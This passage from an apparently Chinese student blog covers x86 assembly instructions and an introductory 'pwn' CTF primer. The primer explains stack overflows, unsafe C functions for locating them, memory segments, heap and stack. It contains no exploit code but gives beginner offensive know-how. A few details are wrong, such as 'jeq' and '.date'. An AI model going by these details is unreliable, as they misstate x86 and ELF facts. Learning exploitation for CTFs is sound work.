class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">sub &lt;reg&gt;,&lt;reg&gt;<br>sub &lt;reg&gt;,&lt;mem&gt;<br>sub &lt;mem&gt;,&lt;reg&gt;<br>sub &lt;reg&gt;,&lt;con&gt;<br>sub &lt;mem&gt;,&lt;con&gt;<br></code></pre></td></tr></table></figure><p>🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">sub al, ah ; AL ← AL - AH<br>sub eax, 216 ; 从存储在EAX中的值中减去216<br></code></pre></td></tr></table></figure><h4 id="inc-dec-递增，递减"><a href="#inc-dec-递增，递减" class="headerlink" title="inc,dec-递增，递减"></a>inc,dec-递增，递减</h4><p>inc指令将其操作对象的内容+1；DEC指令将其操作对象的内容-1</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">inc &lt;reg&gt;<br>inc &lt;mem&gt;<br>dec &lt;reg&gt;<br>dec &lt;mem&gt;<br></code></pre></td></tr></table></figure><p>🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">dec eax ; 从EAX的内容中减去1<br>inc DWORD PTR [var] ; 将存储在位置var的32位整数加1<br></code></pre></td></tr></table></figure><h4 id="imul-整数乘法"><a href="#imul-整数乘法" class="headerlink" title="imul-整数乘法"></a>imul-整数乘法</h4><p>imul指令有两种基本格式：两个操作对象和三个操作对象。</p><p>有两个操作对象时将其两个操作对象相乘，并将结果储存在第一个操作对象当中，其中，第一个对象必须是寄存器。</p><p>有三个操作对象时，将第二个操作对象与第三个操作对象相乘，并将其结果储存在第一个操作对象当中，其中第一个对象必须是寄存器，第三个对象必须是常量值。</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">imul &lt;reg32&gt;,&lt;reg32&gt;<br>imul &lt;reg32&gt;,&lt;mem&gt;<br>imul &lt;reg32&gt;,&lt;reg32&gt;,&lt;con&gt;<br>imul &lt;reg32&gt;,&lt;mem&gt;,&lt;con&gt;<br></code></pre></td></tr></table></figure><p>🌰:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">imul eax, [var] ; 将EAX的内容乘以内存位置var的32位内容并将结果存储在EAX中<br>imul esi, edi, 25 ; ESI → EDI * 25<br></code></pre></td></tr></table></figure><h4 id="idiv-整数除法"><a href="#idiv-整数除法" class="headerlink" title="idiv-整数除法"></a>idiv-整数除法</h4><p>idiv指令将64位整数<code>EDX:EAX</code>的内容除以指定的操作对象值。结果存储在EAX中，其余数的存储在EDX中。</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">idiv &lt;reg32&gt;<br>idiv &lt;mem&gt;<br></code></pre></td></tr></table></figure><p>🌰:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">idiv ebx ; 将EDX:EAX的内容除以EBX的内容。把商放在EAX中，余放在EDX中<br>idiv DWORD PTR [var] ; 将EDX:EAX的内容除以存储在内存位置var的32位值。把商放在EAX中，余放在EDX中<br></code></pre></td></tr></table></figure><h4 id="and-or-xor-按位与、或和异或"><a href="#and-or-xor-按位与、或和异或" class="headerlink" title="and,or xor-按位与、或和异或"></a>and,or xor-按位与、或和异或</h4><p>这些指令对其操作对象执行指定的位运算（分别为按位与、或和异或），并将结果放在第一个操作对象位置。</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs assembly">and &lt;reg&gt;,&lt;reg&gt;<br>and &lt;reg&gt;,&lt;mem&gt;<br>and &lt;mem&gt;,&lt;reg&gt;<br>and &lt;reg&gt;,&lt;con&gt;<br>and &lt;mem&gt;,&lt;con&gt;<br><br>or &lt;reg&gt;,&lt;reg&gt;<br>or &lt;reg&gt;,&lt;mem&gt;<br>or &lt;mem&gt;,&lt;reg&gt;<br>or &lt;reg&gt;,&lt;con&gt;<br>or &lt;mem&gt;,&lt;con&gt;<br><br>xor &lt;reg&gt;,&lt;reg&gt;<br>xor &lt;reg&gt;,&lt;mem&gt;<br>xor &lt;mem&gt;,&lt;reg&gt;<br>xor &lt;reg&gt;,&lt;con&gt;<br>xor &lt;mem&gt;,&lt;con&gt;<br></code></pre></td></tr></table></figure><p>🌰:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">and eax, 0fH ; 清除EAX的除最后4位以外的所有位<br>xor edx, edx ; 将EDX的内容设置为零<br></code></pre></td></tr></table></figure><h4 id="not-按位取反"><a href="#not-按位取反" class="headerlink" title="not-按位取反"></a>not-按位取反</h4><p>not指令触发反转操作对象中的所有位，其结果称为反码。</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">not &lt;reg&gt;<br>not &lt;mem&gt;<br></code></pre></td></tr></table></figure><p>🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">not BYTE PTR [var] ; 取反内存位置var的字节中的所有位<br></code></pre></td></tr></table></figure><h4 id="neg-求补"><a href="#neg-求补" class="headerlink" title="neg-求补"></a>neg-求补</h4><p>neg是汇编指令中的求补指令，对操作对象执行求补运算：用0减去操作对象，然后结果返回操作对象；或是直接将操作对象按位取反后+1</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">neg &lt;reg&gt;<br>neg &lt;mem&gt;<br></code></pre></td></tr></table></figure><p>🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">neg eax ; EAX → - EAX<br></code></pre></td></tr></table></figure><h4 id="shl-shr-左移，右移"><a href="#shl-shr-左移，右移" class="headerlink" title="shl, shr-左移，右移"></a>shl, shr-左移，右移</h4><p>这些指令将其第一个操作对象内容中的位左右移位，用零填充产生的空位位置。移位后的操作对象最多可以移位31位。要移位的位数由第二个操作对象指定，该操作对象可以是8位常量，也可以是寄存器CL。</p><p>在任一情况下，以32为模执行大于31的移位计数。</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">shl &lt;reg&gt;,&lt;con8&gt;<br>shl &lt;mem&gt;,&lt;con8&gt;<br>shl &lt;reg&gt;,&lt;cl&gt;<br>shl &lt;mem&gt;,&lt;cl&gt;<br><br>shr &lt;reg&gt;,&lt;con8&gt;<br>shr &lt;mem&gt;,&lt;con8&gt;<br>shr &lt;reg&gt;,&lt;cl&gt;<br>shr &lt;mem&gt;,&lt;cl&gt;<br></code></pre></td></tr></table></figure><p>🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">shl eax, 1 ; 将EAX的值乘以2（如果最高有效位为0）<br>shr ebx, cl ; 将EBX的值除以2^n^的结果的下限存储在EBX中，其中n是CL中的值<br></code></pre></td></tr></table></figure><h2 id="控制流指令"><a href="#控制流指令" class="headerlink" title="控制流指令"></a>控制流指令</h2><p>x86处理器维护一个指令指针（IP）寄存器，它是一个32位值，指示当前指令在内存中的起始位置。通常，在执行一条指令后，它会递增以指向内存中的下一条指令的起始位置。IP寄存器不能直接操作，而是由提供的控制流指令隐式更新。</p><blockquote><p>我们使用符号&lt;LABEL&gt;来表示代码中已标记的位置。通过输入标签名称后跟冒号，可以在x86汇编代码中的任意位置插入标签。</p></blockquote><p>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">       mov esi, [ebp+8]<br>begin: xor ecx, ecx<br>       mov eax, [esi]<br></code></pre></td></tr></table></figure><p>此代码段中的第二条指令被标记为begin。在代码的其他地方，我们可以使用更方便的符号名称begin来引用此指令所在的内存中的位置。这个标签只是表示位置的一种方便方式，而不是它的32位值。</p><h4 id="jmp-跳转"><a href="#jmp-跳转" class="headerlink" title="jmp-跳转"></a>jmp-跳转</h4><p>将程序控制流转移到操作对象指示的内存位置上</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">jmp &lt;label&gt;<br></code></pre></td></tr></table></figure><p>🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">jmp begin ; 跳到标记为begin的指令位置<br></code></pre></td></tr></table></figure><h4 id="jcondition-条件跳转"><a href="#jcondition-条件跳转" class="headerlink" title="jcondition-条件跳转"></a>jcondition-条件跳转</h4><p>这些指令是基于一组条件码状态判断是否进行跳转，该条件码被存储在称为机器状态字的特殊寄存器中。</p><p>机器状态字的内容包括有关上次执行的算术运算的信息。例如，此字的某一比特位表示最后结果是否为零，某另一个比特位指示上次结果是否为负数。</p><p>基于这些条件码，可以执行多个条件跳转。例如，如果上次算术运算的结果为零，则JZ指令执行到指定操作对象标签的跳转。否则，控制按顺序前进到下一条指令。</p><p>许多条件分支的名字都是根据上一次执行的特殊比较指令cmp命名的。例如，条件分支（如JLE和JNE）基于首先对所需操作对象执行cmp操作。</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">je &lt;label&gt;  ; 相等时跳转<br>jne &lt;label&gt; ; 不相等时跳转<br>jz &lt;label&gt;  ; 最后结果为零时跳转<br>jg &lt;label&gt;  ; 大于时跳转<br>jge &lt;label&gt; ; 大于等于时跳转<br>jl &lt;label&gt;  ; 小于时跳转<br>jle &lt;label&gt; ; 小于等于时跳转<br></code></pre></td></tr></table></figure><p>🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">cmp eax, ebx<br>jle done ; 如果EAX的中的值小于或等于EBX中的值，跳至标签done。否则，继续执行下一条指令<br></code></pre></td></tr></table></figure><h4 id="cmp-比较"><a href="#cmp-比较" class="headerlink" title="cmp-比较"></a>cmp-比较</h4><p>比较两个指定操作对象的值，适当设置机器状态字中的条件代码。此指令等同于sub指令，不同之处在于将丢弃减法结果，而不是替换第一个操作对象。</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">cmp &lt;reg&gt;,&lt;reg&gt;<br>cmp &lt;reg&gt;,&lt;mem&gt;<br>cmp &lt;mem&gt;,&lt;reg&gt;<br>cmp &lt;reg&gt;,&lt;con&gt;<br></code></pre></td></tr></table></figure><p>🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">cmp DWORD PTR [var], 10<br>jeq loop ; 如果存储在var中的4个字节的值等于4字节整数常量10，则跳转到标记为loop的位置<br></code></pre></td></tr></table></figure><h4 id="call-ret-子程序调用和返回"><a href="#call-ret-子程序调用和返回" class="headerlink" title="call, ret-子程序调用和返回"></a>call, ret-子程序调用和返回</h4><p>这些指令实现一个子程序调用和返回。</p><p>call指令首先将当前代码位置压入到内存中硬件支持的堆栈中，然后无条件跳转到标签操作对象指示的代码位置。与简单的跳转指令不同，call指令保存当前位置，并在子程序完成时返回到此处。</p><p>ret指令实现子程序返回机制。此指令首先从硬件支持的内存堆栈中弹出代码位置，然后无条件跳转至该代码位置。</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">call &lt;label&gt;<br>ret<br></code></pre></td></tr></table></figure><hr><p>最近一直被问x86学完了没，这算学完叭（小声bb)🤨</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>x86汇编</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>在PWN的边缘疯狂试探</title>
    <link href="/2023/03/20/%E5%9C%A8PWN%E7%9A%84%E8%BE%B9%E7%BC%98%E7%96%AF%E7%8B%82%E8%AF%95%E6%8E%A2/"/>
    <url>/2023/03/20/%E5%9C%A8PWN%E7%9A%84%E8%BE%B9%E7%BC%98%E7%96%AF%E7%8B%82%E8%AF%95%E6%8E%A2/</url>
    
    <content type="html"><![CDATA[<p>一点点 pwn 基础——栈和堆、汇编基础和Linux常用保护机制</p><span id="more"></span><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>PWN是一个黑客语法的俚语词 ，是指攻破设备或者系统 。发音类似”砰”，对黑客而言，这就是成功实施黑客攻击的声音–砰的一声，被”黑”的电脑或手机就被你操纵了 。</p><p>（上文来自百度）</p><p>个人认为解决PWN题就是利用简单的逆向得到代码，从代码中发现漏洞，再通过二进制或系统调用等方式利用这些漏洞获得目标主机的shell 。</p><p>很酷！！！！！😎</p><h1 id="前知知识"><a href="#前知知识" class="headerlink" title="前知知识"></a>前知知识</h1><p>就是我只知道这么多就来学pwn了</p><h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3><p>寄存器是CPU内部用来存放数据的一些小型存储区域，用来暂时存放参与运算的数据和运算结果。</p><p>我们常常看到 32位 CPU、64位 CPU 这样的名称，其实指的就是寄存器的大小。</p><p>Intel 32位体系结构(简称IA32)处理器包含8个四字节寄存器，如下图所示：</p><p><img src="/img/%E5%9C%A8PWN%E7%9A%84%E8%BE%B9%E7%BC%98%E7%96%AF%E7%8B%82%E8%AF%95%E6%8E%A2/271639137915732.jpg"></p><p>在大多数情况下，上图所示的前6个寄存器均可作为通用寄存器使用。</p><p>编译器会根据操作数大小选择合适的寄存器来生成汇编代码。在汇编语言层面，这组通用寄存器以%e(AT&amp;T语法)或直接以e(Intel语法)开头来引用.</p><p>例如<code>mov $5, %eax</code>或<code>mov eax, 5</code>表示将5赋值给寄存器<strong>eax</strong>。</p><p> 不同架构的CPU，寄存器名称被添加不同前缀以指示寄存器的大小。例如x86架构用字母<strong>“e”</strong>作名称前缀，指示寄存器大小为32位；x86_64架构用字母<strong>“r”</strong>作名称前缀，指示各寄存器大小为64位。</p><h3 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h3><p>栈溢出就是数据会占用一个存储空间，但是我们写代码的时候默认输入数据就是符合规定的数据，并没有对输入数据进行限制，这时超出这个空间大小的数据就会输入到合法空间以外的地方并造成破坏。</p><p>借此我们就可以控制这个不允许用户操作的空间内的寄存器，改变寄存器的值达到代码执行的效果。</p><p>通过寻找危险函数，我们快速确定程序是否可能有栈溢出，以及有的话，栈溢出的位置在哪里。常见的危险函数如下</p><p>输入：</p><ul><li>gets，直接读取一行，忽略’\x00’</li><li>scanf</li><li>vscanf</li></ul><p>输出：</p><ul><li>sprintf</li></ul><p>字符串：</p><ul><li>strcpy，字符串复制，遇到’\x00’停止</li><li>strcat，字符串拼接，遇到’\x00’停止</li><li>bcopy</li></ul><h3 id="Linux的一些基础命令"><a href="#Linux的一些基础命令" class="headerlink" title="Linux的一些基础命令"></a>Linux的一些基础命令</h3><p><code>sudo</code> ：SuperUserDo 在需要权限的命令前使用</p><p><code>apt-get</code>：可以执行安装、升级、甚至移除软件这类任务</p><p><code>grep</code>：配合正则表达式食用，用于寻找文件或内容</p><p><code>cat</code>：查看文件</p><p><code>rm</code>：移除文件，还可以使用**-r**来进行递归移除，从而移除整个文件夹</p><p><code>cp</code>：拷贝文件</p><p><code>ls</code>：查看目录下的文件</p><p><del>暂时只想起这么多</del></p><h1 id="汇编基础"><a href="#汇编基础" class="headerlink" title="汇编基础"></a>汇编基础</h1><blockquote><p>pwn 研究二进制还是要学习底层计算机语言的😢</p></blockquote><p>汇编语言是二进制指令的文本形式，与指令是一一对应的关系。比如，加法指令<code>00000011</code>写成汇编语言就是 <code>ADD</code>。</p><h3 id="堆和栈"><a href="#堆和栈" class="headerlink" title="堆和栈"></a>堆和栈</h3><h4 id="段"><a href="#段" class="headerlink" title="段"></a>段</h4><p>一般情况下，程序都是由bss段，text段和date段三个段组成。</p><p><img src="/img/%E5%9C%A8PWN%E7%9A%84%E8%BE%B9%E7%BC%98%E7%96%AF%E7%8B%82%E8%AF%95%E6%8E%A2/11.png"></p><p>bss 段：只有定义而没有赋初值的全局变量和静态变量。</p><p>data 段：存放在编译阶段 (而非运行时) 就能确定的数据，可读可写。就是通常所说的<strong>静态存储区</strong>，存储赋了初值的全局变量和赋初值的静态变量以及常量。</p><p>text 段：放<strong>程序代码</strong>，在编译时确定，只读。</p><h5 id="bss段"><a href="#bss段" class="headerlink" title=".bss段"></a>.bss段</h5><p>bss段是用来存放未初始化的全局变量和静态变量的一块内存区域，一般在初始化时bss段部分会清零。</p><h5 id="text段"><a href="#text段" class="headerlink" title=".text段"></a>.text段</h5><p>存放程序代码的区域，在编译时确定，只读。</p><p>更进一步讲是存放处理器的机器指令，当各个源文件单独编译之后生成目标文件，经连接器连接各个目标文件并解决各个源文件之间的函数引用。与此同时，还要将所有目标文件中的.text段合在一起，但不是简单的将他们“堆”在一起，还要处理各个段之间函数引用问题。</p><h5 id="date段"><a href="#date段" class="headerlink" title=".date段"></a>.date段</h5><p>用于存放在编译阶段（而非运行时）就能确定的数据，可读可写。也是通常所说的静态存储区，赋了初值的全局变量，常量和静态变量都存放在这个区域。</p><h4 id="Heap-堆"><a href="#Heap-堆" class="headerlink" title="Heap-堆"></a>Heap-堆</h4><p>程序运行的时候，操作系统会给它分配一段内存，用来储存程序和运行产生的数据。这段内存有起始地址和结束地址，比如从<code>0x1000</code>到<code>0x8000</code>，起始地址是较小的那个地址(低位），结束地址是较大的那个地址（高位）。</p><p>程序运行过程中，对于动态的内存占用请求（比如新建对象，或者使用<code>malloc</code>命令），系统就会从预先分配好的那段内存之中，划出一部分给用户，具体规则是从起始地址开始划分。</p><blockquote><p>实际上，起始地址会有一段静态数据，这里忽略</p></blockquote><p>举例来说，用户要求得到10个字节内存，那么从起始地址<code>0x1000</code>开始给他分配，一直分配到地址<code>0x100A</code>，如果再要求得到22个字节，那么就分配到<code>0x1020</code>。</p><p><img src="/img/%E5%9C%A8PWN%E7%9A%84%E8%BE%B9%E7%BC%98%E7%96%AF%E7%8B%82%E8%AF%95%E6%8E%A2/Snipaste_2023-03-20_18-38-37.png"></p><p>这种因为用户主动请求而划分出来的内存区域，就叫做 Heap（堆）。它由<strong>起始地址</strong>开始，从<strong>低位</strong>向<strong>高位</strong>增长。Heap 的一个重要特点就是<strong>不会自动消失</strong>，必须手动释放，或者由垃圾回收机制来回收。</p><h4 id="Strack-栈"><a href="#Strack-栈" class="headerlink" title="Strack-栈"></a>Strack-栈</h4><p>Stack 是由于函数运行而临时占用的内存区域。Stack 是由内存区域的<strong>结束地址</strong>开始，从<strong>高位</strong>向<strong>低位</strong>分配。每一次函数执行结束，就自动释放一个帧，所有函数执行结束，整个 Stack 就都释放了。</p><p>比如，内存区域的结束地址是<code>0x8000</code>，第一帧假定是16字节，那么下一次分配的地址就会从<code>0x7FF0</code>开始；第二帧假定需要64字节，那么地址就会移动到<code>0x7FB0</code>。</p><p>举个具体的🌰：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> a=<span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> b=<span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">return</span> add_a_and_b(a,b);<br>&#125;<br></code></pre></td></tr></table></figure><p>上面代码中，系统开始执行<code>main</code>函数时，会为它在内存里面建立一个帧（frame），所有<code>main</code>的内部变量（比如a和b）都保存在这个帧里面。</p><p><img src="/img/%E5%9C%A8PWN%E7%9A%84%E8%BE%B9%E7%BC%98%E7%96%AF%E7%8B%82%E8%AF%95%E6%8E%A2/Snipaste_2023-03-20_18-50-18.png"></p><p>当调用其他函数时，程序运行到这一行，会新建一个帧。此时存在两个帧：<code>main</code>和<code>add_a_and_b</code>。一般来说，调用栈有多少层，就有多少帧。</p><p><img src="/img/%E5%9C%A8PWN%E7%9A%84%E8%BE%B9%E7%BC%98%E7%96%AF%E7%8B%82%E8%AF%95%E6%8E%A2/Snipaste_2023-03-20_18-49-52.png"></p><p>等到<code>add_a_and_b</code>运行结束，它的帧就会被回收，系统会回到函数<code>main</code>刚才中断执行的地方，继续往下执行。</p><p>生成新的帧，叫做”压栈”，英文是 push；栈的回收叫做”出栈”，英文是 pop。Stack 的特点就是，最晚入栈的帧最早出栈（因为最内层的函数调用，最先结束运行），这就叫做”<strong>后进先出</strong>“的数据结构。每一次函数执行结束，就自动释放一个帧，所有函数执行结束，整个 Stack 就都释放了。通过这种机制，就实现了函数的层层调用，并且每一层都能使用自己的本地变量。</p><h4 id="一个🌰"><a href="#一个🌰" class="headerlink" title="一个🌰"></a>一个🌰</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">add_a_and_b</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> &#123;<br>   <span class="hljs-keyword">return</span> a + b;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>   <span class="hljs-keyword">return</span> add_a_and_b(<span class="hljs-number">2</span>, <span class="hljs-number">3</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>将其转换为汇编语言就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs x86">.file&quot;test.c&quot;<br>.text<br>.globladd_a_and_b<br>.typeadd_a_and_b, @function<br>add_a_and_b:<br>.LFB0:<br>.cfi_startproc<br>pushq%rbp<br>.cfi_def_cfa_offset 16<br>.cfi_offset 6, -16<br>movq%rsp, %rbp<br>.cfi_def_cfa_register 6<br>movl%edi, -4(%rbp)<br>movl%esi, -8(%rbp)<br>movl-4(%rbp), %edx<br>movl-8(%rbp), %eax<br>addl%edx, %eax<br>popq%rbp<br>.cfi_def_cfa 7, 8<br>ret<br>.cfi_endproc<br>.LFE0:<br>.sizeadd_a_and_b, .-add_a_and_b<br>.globlmain<br>.typemain, @function<br>main:<br>.LFB1:<br>.cfi_startproc<br>pushq%rbp<br>.cfi_def_cfa_offset 16<br>.cfi_offset 6, -16<br>movq%rsp, %rbp<br>.cfi_def_cfa_register 6<br>movl$3, %esi<br>movl$2, %edi<br>calladd_a_and_b<br>popq%rbp<br>.cfi_def_cfa 7, 8<br>ret<br>.cfi_endproc<br>.LFE1:<br>.sizemain, .-main<br>.ident&quot;GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609&quot;<br>.section.note.GNU-stack,&quot;&quot;,@progbits<br></code></pre></td></tr></table></figure><blockquote><p>以我现在的水平还不是很能看明白，我就是把文件全复制下来了</p></blockquote><p>简化以后主要就是这些内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs x86">_add_a_and_b:<br>   push   %ebx<br>   mov    %eax, [%esp+8] <br>   mov    %ebx, [%esp+12]<br>   add    %eax, %ebx <br>   pop    %ebx <br>   ret  <br><br>_main:<br>   push   3<br>   push   2<br>   call   _add_a_and_b <br>   add    %esp, 8<br>   ret<br></code></pre></td></tr></table></figure><p>可以看到原程序两个函数<code>add_a_and_b</code>和<code>main</code>对应上面的两个标签<code>_add_a_and_b</code>和<code>_main</code>，每个标签里面是该函数所转成的 CPU 运行流程，每一行就是 CPU 执行的一次操作。</p><p>以其中一行为例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86">push   %ebx<br></code></pre></td></tr></table></figure><p>这一行里面，<code>push</code>是 CPU 指令，<code>%ebx</code>是该指令要用到的运算子。一个 CPU 指令可以有零个到多个运算子。</p><h4 id="基础指令"><a href="#基础指令" class="headerlink" title="基础指令"></a>基础指令</h4><table><thead><tr><th>汇编指令</th><th>实际作用</th><th>等价代码</th></tr></thead><tbody><tr><td>mov rax,rbx</td><td>用于赋值</td><td>rax&#x3D;rbx</td></tr><tr><td>add&#x2F;sub rax,rbx</td><td>用于加&#x2F;减法</td><td>rax+&#x3D;rbx&#x2F;rax-&#x3D;rbx</td></tr><tr><td>and&#x2F;xor&#x2F;or rax,rbx</td><td>用于与&#x2F;异或&#x2F;或</td><td>rax&amp;&#x3D;rbx&#x2F;rax^&#x3D;rbx&#x2F;rax</td></tr><tr><td>push rax</td><td>压栈</td><td>rsp-&#x3D;8;*rsp&#x3D;rax</td></tr><tr><td>pop rax</td><td>出栈</td><td>rax&#x3D;*rsp;rsp+&#x3D;8</td></tr><tr><td>call rax</td><td>调用函数</td><td>push rip;jmp rax;</td></tr><tr><td>ret</td><td>从函数返回</td><td>pop rip;</td></tr><tr><td>cmp rax,rbx</td><td>比较两个数。不保留结果,只修改flags寄存器</td><td>rax-rbx</td></tr><tr><td>test rax,rbx</td><td>比较两个数。不保留结果,只修改flags寄存器</td><td>rax&amp;rbx</td></tr></tbody></table><h4 id="跳转指令"><a href="#跳转指令" class="headerlink" title="跳转指令"></a>跳转指令</h4><table><thead><tr><th>汇编指令示例</th><th>英文全称</th><th>实际作用</th></tr></thead><tbody><tr><td>jmp</td><td>jump</td><td>跳转</td></tr><tr><td>jz</td><td>jump if zero</td><td>为0时跳转</td></tr><tr><td>jnz</td><td>jump if not zero</td><td>不为零时跳转</td></tr><tr><td>jg</td><td>jump if greater</td><td>有符号数大于跳转</td></tr><tr><td>jl</td><td>jump if lsee</td><td>有符号数小于跳转</td></tr></tbody></table><p>跳转指令不同于 mov 指令，他可以用于修改段寄存器 cs、ip 的值，从而修改 CPU 在内存中所读取的内容的地址。</p><p><del>表格是从小卓的博客copy来的</del></p><h1 id="Linux常用保护机制"><a href="#Linux常用保护机制" class="headerlink" title="Linux常用保护机制"></a>Linux常用保护机制</h1><p>操作系统提供了许多安全机制来尝试降低或阻止缓冲区溢出攻击带来的安全风险。在编写漏洞利用代码的时候，需要特别注意目标进程是否开启了 保护机制</p><h4 